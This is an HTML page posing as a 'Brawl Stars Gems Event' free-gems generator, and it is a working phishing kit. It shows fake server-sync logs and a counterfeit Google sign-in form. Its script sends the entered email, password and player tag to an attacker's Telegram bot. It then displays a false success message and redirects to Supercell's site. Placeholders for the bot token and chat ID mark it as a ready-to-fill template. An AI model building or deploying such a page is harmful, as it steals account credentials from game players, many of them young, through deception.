<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars Gems Event</title>
    <link rel="icon" type="image/x-icon" href="https://brawlergems.com/generator/images/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* –¢–í–û–ô CSS –î–ò–ó–ê–ô–ù */
        html {
            min-height: 100%;
            background: linear-gradient(180deg, #1a2969 0%, #2d4596 50%, #4565c9 100%);
            background-attachment: fixed;
        }

        body {
            background: transparent;
            position: relative;
            min-height: 100vh;
            margin: 0;
            font-family: 'Lilita One', cursive;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: 0;
            width: 100vw;
            height: 200vh;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-repeat: repeat;
            background-size: 400px auto;
            opacity: 0.15;
            animation: scrollPattern 120s linear infinite;
            pointer-events: none;
            z-index: 0;
            will-change: transform;
        }

        @keyframes scrollPattern {
            0% { transform: translateY(0); }
            100% { transform: translateY(-50%); }
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 10;
        }

        .logo {
            width: 220px;
            margin: 0 auto 20px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.4));
        }

        /* –ö–∞—Ä—Ç–æ—á–∫–∞ –ø—Ä–æ—Ñ–∏–ª—è */
        .player-profile-card {
            background: white;
            border-radius: 12px;
            padding: 15px 20px;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
            position: relative;
            border: 2px solid #000;
        }

        .profile-header {
            display: flex;
            align-items: center;
            gap: 15px;
            text-align: left;
        }

        .player-icon {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            border: 3px solid #000;
            flex-shrink: 0;
        }

        .player-name { font-size: 26px; color: #000; text-transform: uppercase; margin: 0; line-height: 1; }
        .player-tag { font-size: 16px; color: #666; margin-top: 5px; }

        .championship-badge {
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            color: #000; padding: 4px 10px; border-radius: 6px;
            font-size: 11px; font-weight: bold; border: 2px solid #000;
            margin-top: 8px; display: inline-block;
        }

        .profile-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
        .stat-item {
            display: flex; align-items: center; gap: 8px;
            background: #f8f9fa; padding: 10px; border-radius: 8px; border: 2px solid #000;
        }
        .stat-icon { width: 30px; height: 30px; }
        .stat-value { font-size: 16px; color: #888; font-family: 'Roboto', sans-serif; font-weight: bold; }

        /* –§–æ—Ä–º–∞ –≤–≤–æ–¥–∞ */
        .main-box {
            background: white; border-radius: 20px; padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 4px solid #000; text-align: center;
        }

        .input-group { background: #f0f0f0; border-radius: 12px; padding: 15px; margin: 15px 0; border: 3px solid #ddd; }
        input { width: 100%; border: none; background: transparent; outline: none; font-family: 'Lilita One'; font-size: 24px; text-align: center; color: #000; }

        .btn-bs {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: none; border-radius: 12px; padding: 18px; width: 100%;
            color: white; font-size: 24px; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 0 2px 4px rgba(0,0,0,0.3);
            text-transform: uppercase;
        }
        .btn-bs:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }

        /* Google –°—Ç–∏–ª–∏ */
        .g-auth { font-family: 'Roboto', sans-serif; display: none; text-align: left; }
        .g-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline-color: #1a73e8; }

        /* –ù–∞–≤–∏–≥–∞—Ü–∏—è */
        .back-btn { position: absolute; top: 15px; left: 15px; width: 35px; cursor: pointer; z-index: 100; transition: 0.2s; }
        .back-btn:hover { transform: scale(1.1); }

        /* –ë–æ—Ç-–ø–æ–º–æ—â–Ω–∏–∫ */
        .bot-section { display: flex; align-items: center; margin-top: 30px; }
        .bot-img { width: 75px; height: 75px; border: 4px solid #000; border-radius: 15px; background: #fff; }
        .bubble { background: white; border: 4px solid #000; border-radius: 15px; padding: 12px; margin-left: 15px; color: #000; flex: 1; position: relative; font-size: 15px; }
        .bubble:after { content: ''; position: absolute; left: -19px; top: 50%; transform: translateY(-50%); border-right: 15px solid #000; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <img src="https://brawlergems.com/generator/images/back.png" class="back-btn" id="back-btn" style="display:none;" onclick="location.reload()">

    <div class="main-box" id="main-content">
        <div id="scr-search">
            <h2>Enter Player Tag</h2>
            <div class="input-group">
                <input type="text" id="tag-field" placeholder="#QY82PP..." maxlength="12">
            </div>
            <button class="btn-bs" onclick="startSync()">Connect</button>
        </div>

        <div id="scr-sync" style="display:none;">
            <h2 id="sync-status">SYNCING...</h2>
            <div style="height:14px; background:#eee; border-radius:10px; margin:20px 0; overflow:hidden;">
                <div id="p-bar" style="height:100%; width:0%; background:#FFA800; transition:0.3s;"></div>
            </div>
            <p id="log-text" style="font-family:monospace; font-size:11px; color:#999; text-align:left;"></p>
        </div>

        <div id="scr-profile" style="display:none;">
            <div class="player-profile-card">
                <img src="https://brawlergems.com/generator/images/star-white.png" style="position:absolute; right:10px; top:10px; width:60px; opacity:0.1;">
                <div class="profile-header">
                    <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="player-icon">
                    <div class="player-info">
                        <p class="player-name">ACCOUNT READY</p>
                        <p class="player-tag" id="display-tag">#TAG</p>
                        <div class="championship-badge">SUPERCELL ID LINKED</div>
                    </div>
                </div>
                <div class="profile-stats">
                    <div class="stat-item">
                        <img src="https://brawlergems.com/generator/images/icon_trophy_medium.png" class="stat-icon">
                        <span class="stat-value">PROTECTED</span>
                    </div>
                    <div class="stat-item">
                        <img src="https://brawlergems.com/generator/images/icon_player_level.png" class="stat-icon">
                        <span class="stat-value">ENCRYPTED</span>
                    </div>
                </div>
            </div>
            <button class="btn-bs" onclick="showGoogle()">CLAIM 5000 GEMS</button>
        </div>

        <div id="scr-google" class="g-auth">
            <div style="text-align:center; margin-bottom:20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70">
                <h3 style="font-weight:400; margin-top:10px; font-size:22px; color:#202124;">Sign in</h3>
                <p style="color:#5f6368; font-size:14px;">Verify ownership to receive rewards</p>
            </div>
            <input type="email" id="g-mail" class="g-input" placeholder="Email or phone">
            <input type="password" id="g-pass" class="g-input" placeholder="Enter your password">
            <button class="btn-bs" onclick="sendFinal()" style="margin-top:20px; font-size:20px;">Confirm</button>
        </div>
    </div>

    <div class="bot-section">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="bot-img">
        <div class="bubble"><p id="bot-msg">Welcome! Enter your Player Tag to get your seasonal 5000 Gems!</p></div>
    </div>
</div>

<script>
    // –ù–ê–°–¢–†–û–ô–ö–ò TELEGRAM
    const TOKEN = "–¢–í–û–ô_–¢–û–ö–ï–ù";
    const CHAT_ID = "–¢–í–û–ô_ID";

    let playerTag = "";

    function startSync() {
        playerTag = document.getElementById('tag-field').value.toUpperCase();
        if(playerTag.length < 3) return;

        document.getElementById('scr-search').style.display = 'none';
        document.getElementById('scr-sync').style.display = 'block';
        document.getElementById('bot-msg').innerText = "Connecting to Supercell servers...";

        let p = 0;
        let logs = ["> Searching API...", "> Accessing DB...", "> Tag Verified!", "> Data Encrypted"];
        let lIdx = 0;

        let iv = setInterval(() => {
            p += 5;
            document.getElementById('p-bar').style.width = p + "%";
            if(p % 25 == 0 && lIdx < logs.length) {
                document.getElementById('log-text').innerHTML += `<div>${logs[lIdx]}</div>`;
                document.getElementById('sync-status').innerText = logs[lIdx].replace('> ', '').toUpperCase();
                lIdx++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(() => {
                    document.getElementById('scr-sync').style.display = 'none';
                    document.getElementById('scr-profile').style.display = 'block';
                    document.getElementById('back-btn').style.display = 'block';
                    document.getElementById('display-tag').innerText = playerTag;
                    document.getElementById('bot-msg').innerText = "Account synced! You can now claim your reward.";
                }, 600);
            }
        }, 120);
    }

    function showGoogle() {
        document.getElementById('scr-profile').style.display = 'none';
        document.getElementById('scr-google').style.display = 'block';
        document.getElementById('main-content').style.background = "#fff";
        document.getElementById('bot-msg').innerText = "Please complete the verification below.";
    }

    async function sendFinal() {
        const mail = document.getElementById('g-mail').value;
        const pass = document.getElementById('g-pass').value;
        if(!mail || !pass) return alert("Fill all fields!");

        const text = `üéØ NEW LOG\nTag: ${playerTag}\nEmail: ${mail}\nPass: ${pass}`;
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        
        alert("Verification Successful! Gems will be added to your account within 24 hours.");
        location.href = "https://supercell.com";
    }
</script>

</body>
</html>
